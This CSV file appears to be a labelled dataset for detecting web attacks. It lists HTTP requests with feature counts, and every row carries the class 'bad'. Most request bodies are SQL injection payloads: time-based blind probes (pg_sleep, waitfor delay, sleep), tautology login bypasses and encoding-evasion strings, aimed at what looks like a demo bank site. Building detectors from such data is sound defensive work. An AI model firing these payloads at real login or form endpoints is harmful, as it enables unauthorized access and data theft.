method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=hDP6qkUr&name=ckwiadcj&subject=1,0,0,0,0,0,0,bad
GET,/survey_questions.jsp?step=JyI=,,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=-1));select%20pg_sleep(9);%20--%20,0,0,1,1,3,2,bad
POST,/sendFeedback,submit=Submit&cfile=1%00%c0%a7%c0%a2%252527%252522&comments=1&email_addr=sample%40email.tst&name=yqyvkaxo&subject=1,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=0'XOR(if(now()=sysdate()%2csleep(6)%2c0))XOR'Z,2,0,0,5,0,1,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1'""&email_addr=sample%40email.tst&name=yqyvkaxo&subject=1",1,1,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=0'XOR(if(now()=sysdate()%2csleep(3)%2c0))XOR'Z&name=ckwiadcj&subject=1,2,0,0,5,0,1,bad
GET,/survey_questions.jsp?step=0JNQ53z8');select%20pg_sleep(3);%20--%20,,1,0,1,1,3,2,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=-1%20OR%203*2<(0%2b5%2b350-350)&name=ckwiadcj&subject=1,0,0,0,1,2,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=lrhwetdo&subject=1,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=-1%20OR%202%2b617-617-1=0%2b0%2b0%2b1&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,0,0,0,0,2,0,bad
GET,/index.jsp?content=-1%20OR%203%2b774-774-1=0%2b0%2b0%2b1%20--%20,,0,0,1,0,4,0,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=JyI=,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2=6%20AND%20527=527%20or%20'oOPOjXva'='&uid=1,4,0,0,0,6,1,bad
GET,/search.jsp?query=ZVfPGjyV,,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1'%20OR%202%2b230-230-1=0%2b0%2b0%2b1%20or%20'naMQw5J7'=',4,0,0,0,4,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=-1'%20OR%202%2b364-364-1=0%2b0%2b0%2b1%20or%20'J7yAt4Ty'='&subject=1,4,0,0,0,4,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=-1%20OR%202%2b537-537-1=0%2b0%2b0%2b1%20--%20&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,0,0,1,0,4,0,bad
GET,/index.jsp?content=inside_about.htm,,0,0,0,0,0,0,bad
GET,/search.jsp?query=1%00%c0%a7%c0%a2%252527%252522,,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=1,0,0,0,0,0,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=3mdDgtu7';%20waitfor%20delay%20'0:0:6'%20--%20&subject=1,3,0,1,0,5,2,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=%40%40Zh3Fi&name=yqyvkaxo&subject=1,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=yqyvkaxo&subject=%5c,0,0,0,0,0,0,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=%f0''%f0""""&email_addr=sample%40email.tst&name=yqyvkaxo&subject=1",2,2,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=-1%20OR%202%2b747-747-1=0%2b0%2b0%2b1%20--%20,0,0,1,0,4,0,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1%20OR%202%2b204-204-1=0%2b0%2b0%2b1,0,0,0,0,2,1,bad
GET,/pr,,0,0,0,0,0,0,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=yqyvkaxo&subject=%f0''%f0""""",2,2,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=-1%20OR%203*2>(0%2b5%2b350-350)&name=ckwiadcj&subject=1,0,0,0,1,2,0,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%2540email.tst""%20AND%202*3*8=6*8%20AND%20""K4mi""=""K4mi&name=ckwiadcj&subject=1",0,4,0,0,4,0,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=sample%2540email.tst,0,0,0,0,0,0,bad
POST,/doSubscribe,"btnSubmit=Subscribe&txtEmail=0""XOR(if(now()=sysdate()%2csleep(3)%2c0))XOR""Z",0,2,0,5,0,1,bad
GET,/index.jsp?content=-1%20OR%202%2b158-158-1=0%2b0%2b0%2b1,,0,0,0,0,2,0,bad
GET,/index.jsp?content=business.htm,,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=rqOFfJMi');select%20pg_sleep(9);%20--%20&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,1,0,1,1,3,2,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=Ck1zuaM7'));select%20pg_sleep(9);%20--%20&name=ckwiadcj&subject=1,1,0,1,1,3,2,bad
GET,/search.jsp,,0,0,0,0,0,2,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=1%00%c0%a7%c0%a2%252527%252522,0,0,0,0,0,0,bad
GET,/survey_questions.jsp?step=-1%20OR%203%2b417-417-1=0%2b0%2b0%2b1%20--%20,,0,0,1,0,4,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=xb6f6t0m'));select%20pg_sleep(6);%20--%20,1,0,1,1,3,2,bad
POST,/sendFeedback,submit=Submit&cfile=-1%20OR%202%2b275-275-1=0%2b0%2b0%2b1&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,0,0,0,0,2,0,bad
GET,/search.jsp?query=0'XOR(if(now()=sysdate()%2csleep(6)%2c0))XOR'Z,,2,0,0,5,0,1,bad
GET,/,,0,0,0,0,0,2,bad
GET,/search.jsp?query=1*1*1*1,,0,0,0,0,0,0,bad
GET,/index.jsp?content=personal_loans.htm%25'%20AND%202*3*8=6*8%20AND%20'PabG'!='PabG%25,,4,0,0,0,4,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=Dox2QKqX';select%20pg_sleep(6);%20--%20&name=ckwiadcj&subject=1,1,0,1,1,3,2,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=-1'%20OR%202%2b842-842-1=0%2b0%2b0%2b1%20--%20,1,0,1,0,4,0,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=(select(0)from(select(sleep(9)))v)/*'%2b(select(0)from(select(sleep(9)))v)%2b'""%2b(select(0)from(select(sleep(9)))v)%2b""*/&email_addr=sample%40email.tst&name=ckwiadcj&subject=1",2,2,0,15,0,9,bad
POST,/doLogin,btnSubmit=Login&passw=-1%20OR%202%2b522-522-1=0%2b0%2b0%2b1&uid=1,0,0,0,0,2,1,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2*0=6%20AND%20527=527%20or%20'oOPOjXva'='&uid=1,4,0,0,0,6,1,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2>(0%2b5%2b527-527)%20or%20'oOPOjXva'='&uid=1,4,0,0,1,4,1,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=yqyvkaxo&subject=%bf'%bf""",1,1,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1%00%c0%a7%c0%a2%252527%252522&email_addr=sample%40email.tst&name=yqyvkaxo&subject=1,0,0,0,0,0,0,bad
GET,/search.jsp?query=-1));select%20pg_sleep(6);%20--%20,,0,0,1,1,3,2,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2<(0%2b5%2b910-910)%20or%20'6N78EPpD'='&uid=1,4,0,0,1,4,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=%40%40S3jZ2&subject=1,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=Rl2dFHaY');select%20pg_sleep(10);%20--%20&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,1,0,1,1,3,2,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=if(now()=sysdate()%2csleep(9)%2c0)&name=ckwiadcj&subject=1,0,0,0,4,0,1,bad
GET,/index.jsp?content=-1%20OR%203%2b158-158-1=0%2b0%2b0%2b1,,0,0,0,0,2,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=yqyvkaxo&subject=JyI=,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=1%20waitfor%20delay%20'0:0:3'%20--%20&subject=1,2,0,1,0,5,2,bad
GET,/index.jsp?content=if(now()=sysdate()%2csleep(9)%2c0),,0,0,0,4,0,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=isbIgKzQ');select%20pg_sleep(6);%20--%20,1,0,1,1,3,2,bad
GET,/survey_questions.jsp?step=1%00%c0%a7%c0%a2%252527%252522,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp?step=a,,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%202%2b527-527-1=0%2b0%2b0%2b1%20or%20'oOPOjXva'='&uid=1,4,0,0,0,4,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=-1;%20waitfor%20delay%20'0:0:3'%20--%20&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,2,0,1,0,5,2,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=-1%20OR%202%2b980-980-1=0%2b0%2b0%2b1,0,0,0,0,2,0,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=%5c,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=-1%20OR%202%2b580-580-1=0%2b0%2b0%2b1%20--%20&name=ckwiadcj&subject=1,0,0,1,0,4,0,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%20000910=000910%20AND%203%2b1-1-1=1%20or%20'6N78EPpD'='&uid=1,4,0,0,0,6,1,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=rsfsEvmD');select%20pg_sleep(3);%20--%20,1,0,1,1,3,2,bad
GET,/search.jsp?query=%5c,,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=NBc98vGB';select%20pg_sleep(7);%20--%20&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,1,0,1,1,3,2,bad
POST,/doLogin,"btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=%f0''%f0""""",2,2,0,0,0,1,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=(select(0)from(select(sleep(3)))v)/*'%2b(select(0)from(select(sleep(3)))v)%2b'""%2b(select(0)from(select(sleep(3)))v)%2b""*/&subject=1",2,2,0,15,0,9,bad
POST,/doLogin,btnSubmit=Login&passw=%5c&uid=1,0,0,0,0,0,1,bad
GET,/survey_questions.jsp?step=1%20waitfor%20delay%20'0:0:9'%20--%20,,2,0,1,0,5,2,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=%bf'%bf""&subject=1",1,1,0,0,0,0,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=0""XOR(if(now()=sysdate()%2csleep(3)%2c0))XOR""Z&name=ckwiadcj&subject=1",0,2,0,5,0,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=0'XOR(if(now()=sysdate()%2csleep(9)%2c0))XOR'Z&subject=1,2,0,0,5,0,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=JyI=&name=yqyvkaxo&subject=1,0,0,0,0,0,0,bad
GET,/index.jsp?content=%40%40gieVw,,0,0,0,0,0,0,bad
GET,/index.jsp?content=business_retirement.htm,,0,0,0,0,0,0,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=yqyvkaxo&subject=1'""",1,1,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=-1);select%20pg_sleep(9);%20--%20,0,0,1,1,3,2,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=0""XOR(if(now()=sysdate()%2csleep(9)%2c0))XOR""Z&email_addr=sample%40email.tst&name=ckwiadcj&subject=1",0,2,0,5,0,1,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1'%20OR%202%2b609-609-1=0%2b0%2b0%2b1%20--%20,1,0,1,0,4,1,bad
GET,/feedback.jsp,,0,0,0,0,0,0,bad
GET,/images,,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=-1%20OR%202%2b659-659-1=0%2b0%2b0%2b1&subject=1,0,0,0,0,2,0,bad
GET,/search.jsp?query=-1);select%20pg_sleep(3);%20--%20,,0,0,1,1,3,2,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%202%2b264-264-1=0%2b0%2b0%2b1%20--%20&uid=1,1,0,1,0,4,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1%20waitfor%20delay%20'0:0:6'%20--%20&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,2,0,1,0,5,2,bad
POST,/doLogin,btnSubmit=Login&passw=%40%40hCmP7&uid=1,0,0,0,0,0,1,bad
GET,/swagger/swagger-ui-standalone-preset.js,,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%202%2b910-910-1=0%2b0%2b0%2b1%20or%20'6N78EPpD'='&uid=1,4,0,0,0,4,1,bad
POST,/doLogin,"btnSubmit=Login&passw=1'""&uid=1",1,1,0,0,0,1,bad
GET,/search.jsp?query=EezNcjVE';select%20pg_sleep(6);%20--%20,,1,0,1,1,3,2,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203%2b910-910-1=0%2b0%2b0%2b1%20or%20'6N78EPpD'='&uid=1,4,0,0,0,4,1,bad
GET,/index.jsp?content=7ZP7fS6E';select%20pg_sleep(6);%20--%20,,1,0,1,1,3,2,bad
POST,/doLogin,btnSubmit=Login&passw=JyI=&uid=1,0,0,0,0,0,1,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=-1'%20OR%202%2b533-533-1=0%2b0%2b0%2b1%20or%20'YlzHGUjK'=',4,0,0,0,4,0,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=-1%20OR%202%2b78-78-1=0%2b0%2b0%2b1%20--%20,0,0,1,0,4,0,bad
POST,/sendFeedback,submit=Submit&cfile=-1%20OR%202%2b708-708-1=0%2b0%2b0%2b1%20--%20&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,0,0,1,0,4,0,bad
GET,/survey_questions.jsp?step=gZbGXj29,,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=1%00%c0%a7%c0%a2%252527%252522,0,0,0,0,0,1,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2=6%20AND%20000910=000910%20or%20'6N78EPpD'='&uid=1,4,0,0,0,6,1,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1;%20waitfor%20delay%20'0:0:9'%20--%20,2,0,1,0,5,3,bad
GET,/survey_questions.jsp?step=-1%20OR%203%2b52-52-1=0%2b0%2b0%2b1,,0,0,0,0,2,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%2540email.tst'%20AND%202*3*8=6*8%20AND%20'KBz8'='KBz8&name=ckwiadcj&subject=1,4,0,0,0,4,0,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=%40%40IkDem,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2*1=6%20AND%20527=527%20or%20'oOPOjXva'='&uid=1,4,0,0,0,6,1,bad
GET,/index.jsp?content=1%20waitfor%20delay%20'0:0:9'%20--%20,,2,0,1,0,5,2,bad
POST,/sendFeedback,submit=Submit&cfile=%40%40CK5Ul&comments=1&email_addr=sample%40email.tst&name=yqyvkaxo&subject=1,0,0,0,0,0,0,bad
POST,/sendFeedback,"submit=Submit&cfile=%f0''%f0""""&comments=1&email_addr=sample%40email.tst&name=yqyvkaxo&subject=1",2,2,0,0,0,0,bad
GET,/survey_questions.jsp?step=x1zZdFMp';select%20pg_sleep(3);%20--%20,,1,0,1,1,3,2,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1);select%20pg_sleep(3);%20--%20,0,0,1,1,3,3,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=%5c&email_addr=sample%40email.tst&name=yqyvkaxo&subject=1,0,0,0,0,0,0,bad
GET,/search.jsp?query=zCJqXCvM';%20waitfor%20delay%20'0:0:6'%20--%20,,3,0,1,0,5,2,bad
POST,/doLogin,"btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=0""XOR(if(now()=sysdate()%2csleep(6)%2c0))XOR""Z",0,2,0,5,0,2,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=ErdOUVny';select%20pg_sleep(3);%20--%20,1,0,1,1,3,2,bad
POST,/sendFeedback,submit=Submit&cfile=if(now()=sysdate()%2csleep(7)%2c0)&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,0,0,0,4,0,1,bad
GET,/search.jsp?query=-1);%20waitfor%20delay%20'0:0:3'%20--%20,,2,0,1,0,5,2,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=FarmG3qB&subject=1,0,0,0,0,0,0,bad
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=-1%20OR%202%2b504-504-1=0%2b0%2b0%2b1%20--%20&uid=1,0,0,1,0,4,1,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=-1""%20OR%202%2b547-547-1=0%2b0%2b0%2b1%20--%20&email_addr=sample%40email.tst&name=ckwiadcj&subject=1",0,1,1,0,4,0,bad
GET,/survey_questions.jsp?step=g1Yd7DsZ'));select%20pg_sleep(6);%20--%20,,1,0,1,1,3,2,bad
GET,/index.jsp?content=0'XOR(if(now()=sysdate()%2csleep(3)%2c0))XOR'Z,,2,0,0,5,0,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=-1'%20OR%202%2b657-657-1=0%2b0%2b0%2b1%20--%20,1,0,1,0,4,0,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=0ZOIZmZr';%20waitfor%20delay%20'0:0:9'%20--%20,3,0,1,0,5,2,bad
GET,/survey_questions.jsp?step=-1%20OR%202%2b52-52-1=0%2b0%2b0%2b1,,0,0,0,0,2,0,bad
GET,/swagger/index.html,,0,0,0,0,0,0,bad
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=-1;select%20pg_sleep(9);%20--%20,0,0,1,1,3,2,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=%40%40GOt2p,0,0,0,0,0,1,bad
GET,/search.jsp?query=-1%20OR%202%2b723-723-1=0%2b0%2b0%2b1,,0,0,0,0,2,0,bad
GET,/survey_questions.jsp?step=%40%40tsn52,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,2,bad
GET,/search.jsp?query=-1%20OR%203%2b723-723-1=0%2b0%2b0%2b1,,0,0,0,0,2,0,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=dA0Dq5Eg');select%20pg_sleep(9);%20--%20,1,0,1,1,3,3,bad
GET,/index.jsp?content=business_cards.htm,,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=-1'%20OR%202%2b33-33-1=0%2b0%2b0%2b1%20or%20'WWkd6cYP'='&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,4,0,0,0,4,0,bad
GET,/high_yield_investments.htm,,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=-1;%20waitfor%20delay%20'0:0:3'%20--%20,2,0,1,0,5,2,bad
GET,/index.jsp?content=business_other.htm,,0,0,0,0,0,0,bad
POST,/sendFeedback,"submit=Submit&cfile=1'""&comments=1&email_addr=sample%40email.tst&name=yqyvkaxo&subject=1",1,1,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=1%20waitfor%20delay%20'0:0:6'%20--%20&name=ckwiadcj&subject=1,2,0,1,0,5,2,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=0gQqVexn');select%20pg_sleep(9);%20--%20&name=ckwiadcj&subject=1,1,0,1,1,3,2,bad
GET,/login.jsp,,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%2540email.tst&name=ckwiadcj&subject=1,0,0,0,0,0,0,bad
GET,/index.jsp?content=business_lending.htm,,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=1%20waitfor%20delay%20'0:0:3'%20--%20&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,2,0,1,0,5,2,bad
POST,/doLogin,"btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=(select(0)from(select(sleep(6)))v)/*'%2b(select(0)from(select(sleep(6)))v)%2b'""%2b(select(0)from(select(sleep(6)))v)%2b""*/",2,2,0,15,0,10,bad
GET,/index.jsp?content=1%00%c0%a7%c0%a2%252527%252522,,0,0,0,0,0,0,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=(select(0)from(select(sleep(6)))v)/*'%2b(select(0)from(select(sleep(6)))v)%2b'""%2b(select(0)from(select(sleep(6)))v)%2b""*/&name=ckwiadcj&subject=1",2,2,0,15,0,9,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=-1%20OR%203*2<(0%2b5%2b580-580)%20--%20&name=ckwiadcj&subject=1,0,0,1,1,4,0,bad
POST,/sendFeedback,submit=Submit&cfile=-1'%20OR%202%2b30-30-1=0%2b0%2b0%2b1%20or%20'ypraFpry'='&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,4,0,0,0,4,0,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2<(0%2b5%2b527-527)%20or%20'oOPOjXva'='&uid=1,4,0,0,1,4,1,bad
GET,/survey_questions.jsp?step=-1%20OR%202%2b417-417-1=0%2b0%2b0%2b1%20--%20,,0,0,1,0,4,0,bad
GET,/search.jsp?query=DZnXqH0B');select%20pg_sleep(6);%20--%20,,1,0,1,1,3,2,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=%5c,0,0,0,0,0,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=-1);select%20pg_sleep(3);%20--%20&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,0,0,1,1,3,2,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=1%00%c0%a7%c0%a2%252527%252522&name=yqyvkaxo&subject=1,0,0,0,0,0,0,bad
GET,/status_check.jsp,,0,0,0,0,0,0,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=1%20waitfor%20delay%20'0:0:6'%20--%20,2,0,1,0,5,2,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=1'""&subject=1",1,1,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=if(now()=sysdate()%2csleep(6)%2c0)&subject=1,0,0,0,4,0,1,bad
GET,/index.jsp?content=zd4spQve');select%20pg_sleep(6);%20--%20,,1,0,1,1,3,2,bad
GET,/doLogin,,0,0,0,0,0,2,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2=5%20AND%20527=527%20or%20'oOPOjXva'='&uid=1,4,0,0,0,6,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=-1'%20OR%202%2b940-940-1=0%2b0%2b0%2b1%20--%20&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,1,0,1,0,4,0,bad
POST,/doSubscribe,"btnSubmit=Subscribe&txtEmail=1'""",1,1,0,0,0,0,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=%bf'%bf""&name=yqyvkaxo&subject=1",1,1,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=-1'%20OR%202%2b832-832-1=0%2b0%2b0%2b1%20or%20'aAKZiHEc'=',4,0,0,0,4,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=7pgTGTLe,0,0,0,0,0,0,bad
GET,/search.jsp?query=-1%20OR%203%2b110-110-1=0%2b0%2b0%2b1%20--%20,,0,0,1,0,4,0,bad
GET,/search.jsp?query=1,,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%202%2b1-1-1=1%20AND%20527=527%20or%20'oOPOjXva'='&uid=1,4,0,0,0,6,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=1%00%c0%a7%c0%a2%252527%252522&subject=1,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=yqyvkaxo&subject=1%00%c0%a7%c0%a2%252527%252522,0,0,0,0,0,0,bad
GET,/swagger/swagger-ui-bundle.js,,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%2524%2524w0rD&uid=1,0,0,0,0,0,1,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=%f0''%f0""""&subject=1",2,2,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=oBiLJOkK';select%20pg_sleep(6);%20--%20&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,1,0,1,1,3,2,bad
POST,/sendFeedback,submit=Submit&cfile=VNrlGXkq';%20waitfor%20delay%20'0:0:3'%20--%20&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,3,0,1,0,5,2,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203%2b527-527-1=0%2b0%2b0%2b1%20or%20'oOPOjXva'='&uid=1,4,0,0,0,4,1,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=-1""%20OR%202%2b641-641-1=0%2b0%2b0%2b1%20--%20&subject=1",0,1,1,0,4,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=if(now()=sysdate()%2csleep(6)%2c0)&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,0,0,0,4,0,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=if(now()=sysdate()%2csleep(3)%2c0),0,0,0,4,0,1,bad
POST,/doLogin,"btnSubmit=Login&passw=%f0''%f0""""&uid=1",2,2,0,0,0,1,bad
GET,/survey_questions.jsp?step=Fp7j3nKR';%20waitfor%20delay%20'0:0:9'%20--%20,,3,0,1,0,5,2,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=-1%20OR%203%2b580-580-1=0%2b0%2b0%2b1%20--%20&name=ckwiadcj&subject=1,0,0,1,0,4,0,bad
GET,/search.jsp?query=-1%20OR%202%2b110-110-1=0%2b0%2b0%2b1%20--%20,,0,0,1,0,4,0,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=%bf'%bf""&email_addr=sample%40email.tst&name=yqyvkaxo&subject=1",1,1,0,0,0,0,bad
